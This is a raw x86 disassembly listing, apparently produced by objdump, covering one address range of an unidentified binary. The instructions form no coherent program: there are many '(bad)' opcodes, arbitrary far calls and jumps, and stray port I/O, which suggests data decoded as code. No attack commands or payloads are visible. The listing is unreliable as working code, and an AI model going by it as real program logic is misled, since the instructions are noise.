  422f9d:	inc    BYTE PTR [esi]
  422f9f:	hlt    
  422fa0:	add    DWORD PTR [ebp+0x5f],eax
  422fa3:	dec    esp
  422fa4:	and    al,0x1a
  422fa6:	popa   
  422fa7:	push   0x3f616d6f
  422fac:	jmp    0x422f9c
  422fae:	rcl    DWORD PTR [ebx],1
  422fb0:	and    BYTE PTR [edx],ch
  422fb2:	inc    ecx
  422fb3:	and    DWORD PTR [eax],esi
  422fb5:	push   cs
  422fb6:	adc    DWORD PTR [edi+ebx*1-0xe],eax
  422fba:	not    DWORD PTR [esi+eiz*4+0x64205480]
  422fc1:	aas    
  422fc2:	add    BYTE PTR [eax],0x74
  422fc5:	inc    eax
  422fc6:	cmp    BYTE PTR [ebp-0x7],ch
  422fc9:	add    BYTE PTR [eax],0x88
  422fcc:	push   cs
  422fcd:	cwde   
  422fce:	sahf   
  422fcf:	mov    ebx,0xa8beee20
  422fd4:	push   cs
  422fd5:	push   esp
  422fd6:	mov    esp,0x7bcc103f
  422fdb:	scas   eax,DWORD PTR es:[edi]
  422fdc:	mov    ebp,0xdc0e1fe7
  422fe1:	jg     0x422ff3
  422fe3:	lock aas 
  422fe5:	and    BYTE PTR [ebx],ch
  422fe7:	aas    
  422fe8:	call   0xff14:0xe9a79f7
  422fef:	and    al,0x2b
  422ff1:	jle    0x422fcf
  422ff3:	xor    al,0xfc
  422ff5:	shr    DWORD PTR [edx],cl
  422ff7:	jmp    FWORD PTR [esi]
  422ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ffa:	retf   0xf0
  422ffd:	dec    esp
  422ffe:	sti    
  422fff:	push   cs
  423000:	pusha  
  423001:	mov    al,ds:0x7000a4a0
  423006:	iret   
  423007:	repz mov esp,0x84620af7
  42300d:	push   cs
  42300e:	add    bl,BYTE PTR [esp+ecx*1-0xc30c34c]
  423015:	cmp    al,0x1
  423017:	int3   
  423018:	pmulhuw mm2,QWORD PTR [ecx+edi*2]
  42301c:	call   0x2c10:0x10f8f3cf
  423023:	adc    ah,BYTE PTR [ebx+esi*8]
  423026:	sbb    bl,BYTE PTR [edi+eiz*8+0x50cd3809]
  42302d:	push   ds
  42302e:	sbb    edi,DWORD PTR [edi+ecx*8]
  423031:	jae    0x423002
  423033:	fs sbb al,0xaf
  423036:	push   cs
  423037:	adc    DWORD PTR [eax-0x30c30cf3],ebp
  42303d:	repz mov esp,0xe81ad00e
  423043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423044:	stc    
  423045:	cmp    al,0xcf
  423047:	or     edi,esp
  423049:	add    ebx,DWORD PTR [eax]
  42304b:	sub    eax,0x79e79e13
  423050:	sahf   
  423051:	xor    al,0x18
  423053:	push   esp
  423054:	pop    ss
  423055:	push   0xe79e7904
  42305a:	jns    0x4230d8
  42305c:	push   ds
  42305d:	mov    WORD PTR ds:0xc1f79ea0,ds
  423063:	out    0x7,eax
  423065:	mov    eax,0xcc1fdf2d
  42306a:	push   ds
  42306b:	add    ah,bl
  42306d:	imul   edi,DWORD PTR [esi],0x150ef3cf
  423073:	lock push ss
  423075:	or     BYTE PTR [esi],ch
  423077:	add    eax,0xe79e79e7
  42307c:	sbb    al,0x6
  42307e:	xor    BYTE PTR [eax],cl
  423080:	dec    eax
  423081:	jns    0x423021
  423083:	out    0x75,eax
  423085:	add    DWORD PTR [eax+0x2a8010e],edx
  42308b:	shl    bh,0x79
  42308e:	sahf   
  42308f:	out    0x4d,eax
  423091:	fadd   DWORD PTR [eax-0xc307e14]
  423097:	cmp    al,0xcd
  423099:	or     BYTE PTR [edi],ch
  42309b:	and    BYTE PTR [eax],0x86
  42309e:	cmp    BYTE PTR [eax+0x3cf3cf3c],cl
  4230a4:	push   eax
  4230a5:	mov    eax,ds:0xf384a26c
  4230aa:	cmp    al,0xcf
  4230ac:	repz mov cl,0x9c
  4230af:	mov    dl,0xb4
  4230b1:	mov    edx,0xcf3cf3cf
  4230b6:	int3   
  4230b7:	int3   
  4230b8:	in     al,0xde
  4230ba:	cld    
  4230bb:	out    dx,al
  4230bc:	hlt    
  4230bd:	mov    eax,0x30143e29
  4230c2:	mov    edi,0x2e70e30
  4230c7:	xchg   DWORD PTR [esi],eax
  4230c9:	sbb    al,0x3c
  4230cb:	sbb    al,BYTE PTR [edx+eiz*2]
  4230ce:	push   es
  4230cf:	push   esi
  4230d0:	add    edx,esp
  4230d2:	sar    DWORD PTR [ebx-0x11],0xbd
  4230d6:	or     edx,DWORD PTR [edx]
  4230d8:	or     eax,0xc260e22
  4230dd:	cmovb  ecx,DWORD PTR ss:[ecx]
  4230e1:	sub    ch,0x36
  4230e4:	mov    ah,0xc5
  4230e6:	pop    es
  4230e7:	jp     0x4230ea
  4230e9:	or     BYTE PTR [ecx],0x80
  4230ec:	adc    edi,esi
  4230ee:	push   ds
  4230ef:	push   ds
  4230f0:	fild   DWORD PTR [eax-0x306960e7]
  4230f6:	or     eax,eax
  4230f8:	cmp    eax,0x11ff5bb6
  4230fd:	call   FWORD PTR [ecx]
  4230ff:	pop    edi
  423100:	sub    al,0x3d
  423102:	inc    ecx
  423103:	add    DWORD PTR [edx+0x4cf3df3],edi
  423109:	push   es
  42310a:	dec    esp
  42310b:	lock subps xmm1,XMMWORD PTR [esi]
  42310f:	sar    DWORD PTR [esi],cl
  423111:	daa    
  423112:	dec    edi
  423113:	xor    al,0x74
  423115:	add    al,0x28
  423117:	pusha  
  423118:	dec    esi
  423119:	test   BYTE PTR [eax],dh
  42311b:	sar    BYTE PTR [ecx-0x13],0x10
  42311f:	push   eax
  423120:	push   cs
  423121:	in     al,dx
  423122:	push   ds
  423123:	or     BYTE PTR [edi-0x35],bl
  423126:	ret    0xf79
  423129:	ds jl  0x423132
  42312c:	pop    esp
  42312d:	iret   
  42312e:	mov    ebx,0x6444ef00
  423133:	jbe    0x423101
  423135:	scas   eax,DWORD PTR es:[edi]
  423136:	aam    0x4e
  423138:	sbb    al,0x34
  42313a:	sbb    BYTE PTR [edi],bl
  42313c:	lock popf 
  42313e:	pop    esp
  42313f:	push   es
  423140:	sub    al,0x5c
  423142:	jg     0x4231b0
  423144:	psubb  mm6,QWORD PTR [edi+ebx*8]
  423148:	(bad)  
  423149:	push   es
  42314a:	lods   al,BYTE PTR ds:[esi]
  42314b:	pop    ebp
  42314c:	fs cmp al,0xf0
  42314f:	pop    edi
  423150:	idiv   DWORD PTR [edi+eiz*1+0x667cee49]
  423157:	or     al,0x3c
  423159:	out    dx,eax
  42315a:	fiadd  WORD PTR [ecx]
  42315c:	idiv   DWORD PTR ds:0xcc06100e
  423162:	sub    dh,dh
  423164:	les    dx,DWORD PTR ss:[eax+edi*2]
  423169:	fdivrp st(3),st
  42316b:	push   es
  42316c:	aam    0xbc
  42316e:	push   ds
  42316f:	cmp    al,0x84
  423171:	scas   eax,DWORD PTR es:[edi]
  423172:	mov    esi,0x34def817
  423177:	xchg   BYTE PTR [esi+edx*4],bl
  42317a:	inc    esp
  42317b:	pop    ebp
  42317c:	daa    
  42317d:	test   BYTE PTR [esi],bl
  42317f:	lock xor BYTE PTR fs:[ebx+0x4f],0x69
  423185:	xchg   esp,eax
  423186:	push   cs
  423187:	push   esp
  423188:	pop    edi
  423189:	aas    
  42318a:	loopne 0x42316c
  42318c:	ins    BYTE PTR es:[edi],dx
  42318d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42318e:	das    
  42318f:	in     al,dx
  423190:	addr16 (bad) 
  423192:	mov    eax,?
  423194:	sahf   
  423195:	xor    al,0x33
  423197:	cwde   
  423198:	add    dl,BYTE PTR [ebx-0x19]
  42319b:	adc    al,0x27
  42319d:	pop    esp
  42319e:	pop    ds
  42319f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231a0:	test   DWORD PTR [esp+ebx*1],0x74069cde
  4231a7:	pop    ds
  4231a8:	lahf   
  4231a9:	push   ss
  4231aa:	mov    ah,0x3f
  4231ac:	sahf   
  4231ad:	test   BYTE PTR ds:0xf0540e3e,0x8f
  4231b4:	and    BYTE PTR [eax+0x76],ah
  4231b7:	pushf  
  4231b8:	push   esp
  4231b9:	stc    
  4231ba:	xor    al,0xdf
  4231bc:	push   ebx
  4231bd:	mov    ss,WORD PTR [esi+edx*1]
  4231c0:	mov    esp,0x5ee41c5c
  4231c5:	dec    ebp
  4231c6:	xor    edi,0x8c1e37dc
  4231cc:	push   cs
  4231cd:	ins    BYTE PTR es:[edi],dx
  4231ce:	out    dx,eax
  4231cf:	inc    esp
  4231d0:	cmp    eax,0x67c0f34f
  4231d5:	push   es
  4231d6:	and    al,0x5d
  4231d8:	lock ins BYTE PTR es:[edi],dx
  4231da:	mov    ah,0x29
  4231dc:	jo     0x42319c
  4231de:	out    0x16,eax
  4231e0:	pushf  
  4231e1:	cld    
  4231e2:	jle    0x423188
  4231e4:	pop    ebp
  4231e5:	out    0xcf,eax
  4231e7:	jnp    0x4231d8
  4231e9:	or     BYTE PTR [esi],al
  4231eb:	je     0x42322b
  4231ed:	inc    esp
  4231ee:	xchg   ah,bl
  4231f0:	push   es
  4231f1:	jl     0x42325f
  4231f3:	out    dx,al
  4231f4:	imul   ebx,ebp,0x240e2773
  4231fa:	xchg   DWORD PTR [ecx+0x66],edx
  4231fd:	les    ecx,FWORD PTR [edi+esi*1+0x708ee0f2]
  423204:	dec    esi
  423205:	jbe    0x42321f
  423207:	neg    esi
  423209:	mov    ah,0xf0
  42320b:	fidivr WORD PTR [eax]
  42320d:	lahf   
  42320e:	jle    0x4231a4
  423210:	pop    esp
  423211:	cs mov esi,0x6288080c
  423217:	mov    DWORD PTR [edi+0x51014601],edx
  42321d:	adc    bh,BYTE PTR [esi]
  42321f:	add    BYTE PTR [eax],dl
  423221:	rol    DWORD PTR [edi],0x80
  423224:	inc    ecx
  423225:	add    BYTE PTR [ecx+esi*4],cl
  423228:	xor    BYTE PTR ds:[ebp+0x72],0x10
  42322d:	nop
  42322e:	inc    ecx
  42322f:	and    esi,DWORD PTR [ebp+0x1041555]
  423235:	and    BYTE PTR [edx],al
  423237:	dec    ecx
  423238:	push   ecx
  423239:	and    ah,BYTE PTR [eax-0x12f8d7a8]
  42323f:	jle    0x42323f
  423241:	mov    edi,0x440006
  423246:	push   esi
  423247:	add    BYTE PTR [ebx+0x0],al
  42324a:	dec    esp
  42324b:	add    BYTE PTR [ecx+0xb],al
  42324e:	add    BYTE PTR [eax+0xe],dl
  423251:	sbb    cl,BYTE PTR [ebx-0x1]
  423254:	jg     0x423255
  423256:	aas    
  423257:	inc    edi
  423258:	add    BYTE PTR [ebp+0x0],al
  42325b:	dec    ecx
  42325c:	add    BYTE PTR [esi+0x0],cl
  42325f:	inc    esi
  423260:	add    BYTE PTR [edi-0x60],cl
  423263:	push   0xfffffff5
  423265:	add    BYTE PTR [ecx+0x7d],dl
  423268:	add    bh,bh
  42326a:	test   BYTE PTR [eax],0x43
  42326d:	pop    es
  42326e:	add    bh,bh
  423270:	(bad)  
  423271:	(bad)  
  423272:	dec    eax
  423274:	and    eax,0xa3e300
  423279:	push   edi
  42327a:	stc    
  42327b:	add    BYTE PTR [eax+eax*8+0x6e2f00],dh
  423282:	lods   eax,DWORD PTR ds:[esi]
  423283:	add    BYTE PTR [bp+di+0x66],ch
  423287:	add    BYTE PTR [edx],ah
  423289:	test   al,0x0
  42328b:	sub    ebp,ebp
  42328d:	add    BYTE PTR [ebp-0x16dcff91],ah
  423293:	(bad)  
  423294:	(bad)  
  423295:	(bad)  
  423296:	inc    DWORD PTR [eax]
  423298:	loope  0x423292
  42329a:	add    BYTE PTR [esi+0x1a61001b],dl
  4232a0:	add    BYTE PTR [esi+0x27660016],bl
  4232a6:	add    al,ch
  4232a8:	adc    DWORD PTR [eax],eax
  4232aa:	push   ebx
  4232ab:	push   ecx
  4232ac:	add    BYTE PTR [esi-0x53],bl
  4232af:	add    BYTE PTR [esi+0x2f],ch
  4232b2:	add    BYTE PTR [edi-0x78],bl
  4232b5:	add    BYTE PTR [eax],cl
  4232b7:	out    0x6f,al
  4232b9:	(bad)  
  4232ba:	inc    DWORD PTR [edx+0xb5f400]
  4232c0:	jbe    0x42324b
  4232c2:	add    BYTE PTR [esi+eax*4],dh
  4232c5:	add    BYTE PTR [ebx+eax*1],cl
  4232c8:	add    BYTE PTR [eax-0x40ffb483],cl
  4232ce:	add    al,BYTE PTR [eax]
  4232d0:	jle    0x4232d1
  4232d2:	mov    edi,0xb107f6b5
  4232d7:	add    BYTE PTR [ecx],ch
  4232d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232da:	jle    0x423294
  4232dc:	pop    ebp
  4232dd:	and    cl,BYTE PTR [ecx*8+0xe0fa00]
  4232e4:	xchg   ebx,eax
  4232e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232e6:	add    al,bh
  4232e8:	add    BYTE PTR [eax],0x14
  4232eb:	aad    0xdb
  4232ed:	outs   dx,BYTE PTR ds:[esi]
  4232ee:	outs   dx,DWORD PTR ds:[esi]
  4232ef:	outs   dx,DWORD PTR ds:[esi]
  4232f0:	mov    al,ds:0xdaa20023
  4232f5:	call   0x5fac:0xddcb0021
  4232fc:	add    BYTE PTR [esi+ebp*8+0x45],dl
  423300:	shl    BYTE PTR [esi+0x5bfedfdb],cl
  423306:	in     al,dx
  423307:	call   0xd1d333ed
  42330c:	add    al,dl
  42330e:	mov    al,0x0
  423310:	sub    al,0xfa
  423312:	scas   al,BYTE PTR es:[edi]
  423313:	nop
  423314:	add    bh,cl
  423316:	push   cs
  423317:	add    BYTE PTR [ebp-0x60],cl
  42331a:	sub    DWORD PTR [edx],0xffffffff
  42331d:	outs   dx,DWORD PTR ds:[esi]
  42331e:	(bad)  
  42331f:	inc    DWORD PTR [eax]
  423321:	dec    edx
  423322:	lds    eax,FWORD PTR [eax]
  423324:	cmp    ecx,DWORD PTR [ebp+0xa0d000]
  42332a:	cmp    al,0xfd
  42332c:	add    BYTE PTR [esi+0x3e00fc41],bh
  423332:	mov    dh,0x0
  423334:	xor    BYTE PTR [ebx+0x7b3500],ch
  42333a:	loop   0x423347
  42333c:	add    al,0x6d
  42333e:	mov    bl,0xa
  423340:	fdivr  QWORD PTR [ecx+ecx*4+0x6f]
  423344:	out    dx,al
  423345:	(bad)  
  423346:	fidiv  WORD PTR [esi]
  423348:	pop    eax
  423349:	sub    ah,bh
  42334b:	(bad)  
  42334c:	fcmovnu st,st(3)
  42334e:	add    BYTE PTR [ecx],ah
  423350:	jl     0x42337c
  423352:	push   edx
  423353:	add    BYTE PTR [edx],bh
  423355:	cmp    bl,dl
  423357:	fwait
  423358:	add    BYTE PTR [edi+edx*4+0x0],bl
  42335c:	sbb    dl,ch
  42335e:	add    ch,cl
  423360:	fld    DWORD PTR [eax]
  423362:	daa    
  423363:	leave  
  423364:	add    ch,dl
  423366:	fdivr  st(0),st
  423368:	(bad)  
  423369:	push   ss
  42336a:	shl    dh,cl
  42336c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42336d:	pop    esi
  42336e:	clc    
  42336f:	loop   0x423375
  423371:	add    BYTE PTR [edi+0xac54d1],dh
  423377:	add    al,0x6b
  423379:	mov    bh,0xff
  42337b:	fild   QWORD PTR [ecx]
  42337d:	mov    bl,0x0
  42337f:	je     0x4233b6
  423381:	add    BYTE PTR [edx],cl
  423383:	add    DWORD PTR [eax],0x63001784
  423389:	iret   
  42338a:	mov    fs,WORD PTR [eax+eax*1+0x227c1682]
  423391:	push   ss
  423392:	mov    esp,0x20bd7fe1
  423397:	add    BYTE PTR [eax-0x1],bh
  42339a:	add    BYTE PTR ds:0x20c00037,al
  4233a0:	xor    al,0xd6
  4233a2:	add    BYTE PTR [ecx-0x6a],dh
  4233a5:	xor    edi,DWORD PTR [ebx+0x816dec0]
  4233ab:	fsubp  st(2),st
  4233ad:	cwde   
  4233ae:	rol    BYTE PTR [edx+0x2102005d],1
  4233b4:	adc    BYTE PTR [edi],ch
  4233b6:	mov    al,0xb6
  4233b8:	mov    ebp,0xdbc184
  4233bd:	pushf  
  4233be:	push   ss
  4233bf:	scas   eax,DWORD PTR es:[edi]
  4233c0:	push   ebp
  4233c1:	mov    esi,0xa5c6ee58
  4233c6:	add    BYTE PTR gs:[esi],ah
  4233c9:	xor    ebp,DWORD PTR [esi+eax*4-0x7e]
  4233cd:	ins    BYTE PTR es:[edi],dx
  4233ce:	jle    0x4233e3
  4233d0:	or     dl,ah
  4233d2:	lods   al,BYTE PTR ds:[esi]
  4233d3:	ins    DWORD PTR es:[edi],dx
  4233d4:	sahf   
  4233d5:	push   0xffffff8b
  4233d7:	dec    eax
  4233d8:	mov    ah,0x66
  4233da:	retf   0xf3d0
  4233dd:	adc    BYTE PTR [edx+0x431b00ea],cl
  4233e3:	mov    bl,0xf6
  4233e5:	cmp    BYTE PTR [eax+0x24],0xfb
  4233e9:	add    BYTE PTR [esi],ch
  4233eb:	inc    esp
  4233ec:	out    dx,al
  4233ed:	push   ebx
  4233ee:	jo     0x4233b4
  4233f0:	inc    edx
  4233f1:	je     0x4233b4
  4233f3:	xchg   BYTE PTR [edi],dh
  4233f5:	jg     0x4233f4
  4233f7:	inc    DWORD PTR [eax]
  4233f9:	in     eax,dx
  4233fa:	push   es
  4233fb:	add    al,cl
  4233fd:	out    0x32,al
  4233ff:	add    BYTE PTR [esi-0x3ff0b050],dh
  423405:	and    BYTE PTR [esi+0x6b0602f8],0x69
  42340c:	add    BYTE PTR [edx-0x6c],bh
  42340f:	mov    BYTE PTR [eax],dl
  423411:	pusha  
  423412:	fcomp  st(6)
  423414:	cld    
  423415:	outs   dx,DWORD PTR ds:[esi]
  423416:	clc    
  423417:	and    BYTE PTR [eax+eax*1-0x7a2b6223],bh
  42341e:	add    cl,bl
  423420:	fild   DWORD PTR [eax]
  423422:	les    esp,FWORD PTR [edx]
  423424:	add    ah,ah
  423426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423427:	push   ds
  423428:	add    BYTE PTR [edx-0x52fa0ff4],dl
  42342e:	fld    QWORD PTR [esi+0x2b]
  423431:	add    ah,ch
  423433:	jo     0x42348c
  423435:	out    dx,al
  423436:	push   esp
  423437:	shl    BYTE PTR [edx+0x33],cl
  42343a:	add    BYTE PTR [edx-0x74],ah
  42343d:	or     ch,ah
  42343f:	(bad)  
  423441:	mov    esp,0xb9f9009e
  423446:	jo     0x4233ff
  423448:	add    ch,al
  42344a:	mov    DWORD PTR [eax],0xc0003ed3
  423450:	jmp    0xf21b:0x8afb717a
  423457:	jle    0x423459
  423459:	xchg   esi,ebp
  42345b:	or     BYTE PTR [ecx+0x0],dh
  42345e:	mov    bl,0x31
  423460:	mov    esi,0x1a8e00cc
  423465:	push   ds
  423466:	scas   al,BYTE PTR es:[edi]
  423467:	pop    eax
  423468:	repnz mov ch,al
  42346b:	jl     0x42344f
  42346d:	add    BYTE PTR ds:0xa34ac6fe,dl
  423473:	ficom  WORD PTR [ecx+0x61]
  423476:	outs   dx,DWORD PTR ds:[esi]
  423477:	pop    edx
  423478:	add    BYTE PTR [ebx*8+0x305adc1c],bl
  42347f:	mov    ds:0x78240063,eax
  423484:	sti    
  423485:	fld    TBYTE PTR [ebx]
  423487:	les    ebx,FWORD PTR [edi+0x469b001d]
  42348d:	stos   BYTE PTR es:[edi],al
  42348e:	imul   eax,DWORD PTR [eax],0xffffffbc
  423491:	aam    0x0
  423493:	aam    0x34
  423495:	xor    ecx,esi
  423497:	add    BYTE PTR [edx-0x5790938c],dh
  42349d:	mov    cs,WORD PTR ds:0x7604b0
  4234a3:	cmp    BYTE PTR [eax],dl
  4234a5:	xor    BYTE PTR [edx+0x7e],al
  4234a8:	dec    ebp
  4234a9:	outs   dx,DWORD PTR ds:[esi]
  4234aa:	push   0x7fda3705
  4234af:	add    BYTE PTR [eax-0x5e],al
  4234b2:	sti    
  4234b3:	sbb    al,0xf3
  4234b5:	mov    esi,es
  4234b7:	xchg   DWORD PTR [eax],eax
  4234b9:	fidiv  WORD PTR [eax+0x30f15c15]
  4234bf:	add    BYTE PTR [eax+0xd4c3d],dh
  4234c5:	into   
  4234c6:	lock imul esi,DWORD PTR [eax+0x6b],0x51dc3892
  4234ce:	push   ecx
  4234cf:	sub    dl,BYTE PTR ds:0xa184ae40
  4234d5:	add    bl,bl
  4234d7:	(bad)  
  4234d8:	(bad)  
  4234d9:	mov    al,0x99
  4234db:	scas   eax,DWORD PTR es:[edi]
  4234dc:	dec    esp
  4234dd:	out    0xe5,eax
  4234df:	add    bl,dl
  4234e1:	and    ah,bl
  4234e3:	hlt    
  4234e4:	sbb    al,0x5c
  4234e6:	adc    al,BYTE PTR [esi+0xb]
  4234e9:	or     bl,BYTE PTR [edx-0x15ffd601]
  4234ef:	aas    
  4234f0:	add    BYTE PTR [ebp+0x57],dl
  4234f3:	add    BYTE PTR [edx+0x70],bl
  4234f6:	xor    BYTE PTR [esi+0x54],cl
  4234f9:	push   cs
  4234fa:	mov    es,WORD PTR [ebp-0x45]
  4234fd:	pusha  
  4234fe:	rol    DWORD PTR [eax],0xf7
  423501:	jb     0x42357b
  423503:	xchg   esi,eax
  423504:	inc    edx
  423505:	add    DWORD PTR [eax],eax
  423507:	jg     0x423585
  423509:	(bad)  
  42350a:	fs mov bh,0xb6
  42350d:	jns    0x423552
  42350f:	not    BYTE PTR [esi+0x3b]
  423512:	mov    ecx,0xc7065300
  423517:	adc    BYTE PTR [eax+0x4c],dh
  42351a:	sbb    eax,0x179b8d00
  42351f:	je     0x4234b9
  423521:	dec    ebp
  423522:	dec    esi
  423523:	test   eax,0xd2c7f0
  423528:	xchg   esp,eax
  423529:	mov    dh,ch
  42352b:	inc    ebx
  42352c:	shl    ecx,0x60
  42352f:	mov    al,ds:0x2790fea4
  423534:	sub    al,0x6f
  423536:	mov    al,0xe6
  423538:	ins    DWORD PTR es:[edi],dx
  423539:	jae    0x42359b
  42353b:	fsubr  st(3),st
  42353d:	add    BYTE PTR [edi],dl
  42353f:	pop    esp
  423540:	xor    eax,0x7d2a8046
  423545:	add    BYTE PTR [ebp+0x360bccd8],dl
  42354b:	(bad)  
  42354c:	out    dx,al
  42354d:	xor    BYTE PTR [ecx+0x0],dh
  423550:	scas   eax,DWORD PTR es:[edi]
  423551:	retf   0x3740
  423554:	test   ebp,0xee41561b
  42355a:	add    BYTE PTR [ebx],al
  42355c:	in     al,dx
  42355d:	jae    0x4235db
  42355f:	add    BYTE PTR [esi],bh
  423561:	pop    esi
  423562:	mov    al,BYTE PTR [edx]
  423564:	repz cmp BYTE PTR [eax-0x3aff3264],0x85
  42356c:	nop
  42356d:	icebp  
  42356e:	inc    eax
  42356f:	sub    ebp,DWORD PTR [eax+eiz*2+0xa87f3]
  423576:	int3   
  423577:	enter  0xf036,0x5d
  42357b:	call   0x536e09fc
  423580:	repz xchg ch,cl
  423583:	add    BYTE PTR [edi+0x13],ch
  423586:	cwde   
  423587:	sub    al,0x1b
  423589:	add    BYTE PTR [ebx],ah
  42358b:	out    dx,eax
  42358c:	enter  0xb604,0x55
  423590:	mov    esp,0x90c9a143
  423595:	pop    ds
  423596:	add    BYTE PTR [ebp+0x6a],ah
  423599:	call   0x64d35226
  42359e:	and    ch,ch
  4235a0:	push   0x108cdfa2
  4235a5:	icebp  
  4235a6:	sub    dh,BYTE PTR [edx-0x64]
  4235a9:	jg     0x4235f2
  4235ab:	imul   ebx,DWORD PTR [ebx],0xffffff92
  4235ae:	add    BYTE PTR [ebp+0x58],dh
  4235b1:	clc    
  4235b2:	sub    BYTE PTR [edx+ecx*4],cl
  4235b5:	(bad)  
  4235b6:	mov    ebp,0x495700
  4235bb:	jp     0x42355d
  4235bd:	ret    0x9876
  4235c0:	es mov ah,0x4
  4235c3:	(bad)  
  4235c6:	das    
  4235c7:	inc    ebx
  4235c8:	mov    cl,0xa2
  4235ca:	mov    al,ds:0xf7d2b6b4
  4235cf:	les    esi,FWORD PTR [ecx+0x5b]
  4235d2:	fadd   QWORD PTR [ebp-0x53]
  4235d5:	test   al,0xa2
  4235d7:	jmp    0x7cb1:0x4a3dfabb
  4235de:	pop    ds
  4235df:	ds loopne 0x42361d
  4235e2:	adc    al,0x47
  4235e4:	inc    ebp
  4235e5:	mov    al,0x19
  4235e7:	(bad)  
  4235e8:	lock sar BYTE PTR [eax-0x67],1
  4235ec:	cli    
  4235ed:	inc    ecx
  4235ee:	rcr    DWORD PTR [ebx],cl
  4235f0:	inc    esp
  4235f1:	jp     0x42358b
  4235f3:	ret    
  4235f4:	bound  eax,QWORD PTR [eax]
  4235f6:	sub    dl,ah
  4235f8:	xor    edi,DWORD PTR [eax+0x5a]
  4235fb:	inc    ecx
  4235fc:	and    DWORD PTR [eax+0x10],0x34126610
  423603:	pushf  
  423604:	aas    
  423605:	mov    esi,0x8a2a1aad
  42360a:	cmp    al,BYTE PTR [edx-0x5e]
  42360d:	dec    edx
  42360e:	sub    al,0xee
  423610:	enter  0x4d3e,0x50
  423614:	rcr    BYTE PTR [edx],1
  423616:	mov    bh,BYTE PTR [edx-0x42]
  423619:	(bad)  
  42361a:	out    dx,eax
  42361b:	adc    BYTE PTR [eax-0x7c],ch
  42361e:	(bad)  [edx+0x74db4779]
  423624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423625:	loop   0x423649
  423627:	or     esp,ecx
  423629:	add    DWORD PTR [eax],eax
  42362b:	pop    esi
  42362c:	xor    al,0x95
  42362e:	inc    ebp
  42362f:	fwait
  423630:	or     bl,BYTE PTR [edx+0x78d2b2a8]
  423636:	ins    DWORD PTR es:[edi],dx
  423637:	push   ss
  423638:	iret   
  423639:	xchg   esi,eax
  42363a:	and    BYTE PTR [ecx],bl
  42363c:	dec    ecx
  42363d:	shl    ecx,1
  42363f:	out    0x0,al
  423641:	inc    eax
  423642:	mov    ds:0x9fdf0005,al
  423647:	xchg   esi,eax
  423648:	stos   BYTE PTR es:[edi],al
  423649:	push   ss
  42364a:	lds    ebp,FWORD PTR [ebp+0x6b]
  42364d:	mov    ah,0x4
  42364f:	jae    0x423675
  423651:	(bad)  
  423652:	fidiv  DWORD PTR [edx+0x2d46bd90]
  423658:	add    dh,ch
  42365a:	or     dh,BYTE PTR [ebp+0x495b468a]
  423660:	out    dx,al
  423661:	out    0xb2,eax
  423663:	jmp    FWORD PTR [ebp+0x4]
  423666:	add    ah,BYTE PTR [edx]
  423668:	sti    
  423669:	ficom  WORD PTR [esi]
  42366b:	adc    al,0x14
  42366d:	ret    0x5a7c
  423670:	(bad)  
  423671:	ins    BYTE PTR es:[edi],dx
  423672:	xchg   ebx,eax
  423673:	inc    eax
  423674:	sbb    al,0xc3
  423676:	add    BYTE PTR [edi],dl
  423678:	jl     0x4236ce
  42367a:	push   ebp
  42367b:	shl    BYTE PTR [ecx+0x54],1
  42367e:	mov    DWORD PTR [edx+ecx*1-0x52bb4a22],ebx
  423685:	jns    0x423662
  423687:	adc    BYTE PTR [edi],bl
  423689:	into   
  42368a:	jo     0x4236dd
  42368c:	add    BYTE PTR [ebp-0x28cbba16],ah
  423692:	(bad)  
  423693:	push   esp
  423694:	shl    BYTE PTR [eax+0x2b],1
  423697:	xor    al,0x23
  423699:	mov    eax,ds:0x961ee652
  42369e:	xor    DWORD PTR [esi-0x18d1ab5],ebx
  4236a4:	in     eax,dx
  4236a5:	jl     0x4236ce
  4236a7:	mov    ebp,0xa973cb7d
  4236ac:	pop    esp
  4236ad:	out    dx,eax
  4236ae:	mov    bl,0x2
  4236b0:	cmc    
  4236b1:	jb     0x42372c
  4236b3:	cs xchg ebp,eax
  4236b5:	cld    
  4236b6:	imul   esi,edx,0xffffffa1
  4236b9:	or     edx,DWORD PTR [esi+ebp*1-0x31]
  4236bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236be:	call   DWORD PTR [ebx+0x31]
  4236c1:	lods   eax,DWORD PTR ds:[esi]
  4236c2:	dec    ebx
  4236c3:	xchg   edi,eax
  4236c4:	retf   0xb9e5
  4236c7:	test   BYTE PTR [ecx+0x1c7ed736],0x52
  4236ce:	mov    ecx,0x5ba8113c
  4236d3:	loope  0x42366c
  4236d5:	out    0x52,eax
  4236d7:	mov    ecx,0x71862f70
  4236dc:	(bad)  
  4236dd:	in     eax,0xf2
  4236df:	pop    esp
  4236e0:	sub    bh,BYTE PTR [ebx-0x56ab3efc]
  4236e6:	pop    esp
  4236e7:	sahf   
  4236e8:	dec    ebx
  4236e9:	aaa    
  4236ea:	mov    dl,0x71
  4236ec:	loope  0x423699
  4236ee:	cs xchg ebp,eax
  4236f0:	retf   
  4236f1:	jae    0x423713
  4236f3:	loope  0x4236b4
  4236f5:	pop    edi
  4236f6:	mov    bh,0xcf
  4236f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236f9:	jb     0x423774
  4236fb:	leave  
  4236fc:	sub    dl,BYTE PTR [ebx-0x461aa6a2]
  423702:	push   esp
  423703:	cs mov bh,0x5f
  423706:	cmc    
  423707:	cdq    
  423708:	pop    edi
  423709:	call   0x8a6c:0xd339ca97
  423710:	or     DWORD PTR [esi+0x7cdfc300],esi
  423716:	jae    0x42370b
  423718:	rol    DWORD PTR [eax],0x47
  42371b:	cmp    al,0xbf
  42371d:	add    BYTE PTR [ecx],ch
  42371f:	js     0x42371a
  423721:	add    BYTE PTR [ebp-0x4effaebb],al
  423727:	xor    eax,DWORD PTR [eax]
  423729:	pusha  
  42372a:	sbb    ebp,DWORD PTR [ebx+esi*8+0x33]
  42372e:	retf   0x8c00
  423731:	xchg   esp,eax
  423732:	div    BYTE PTR [eax+0x38]
  423735:	adc    edx,ebx
  423737:	adc    dh,bl
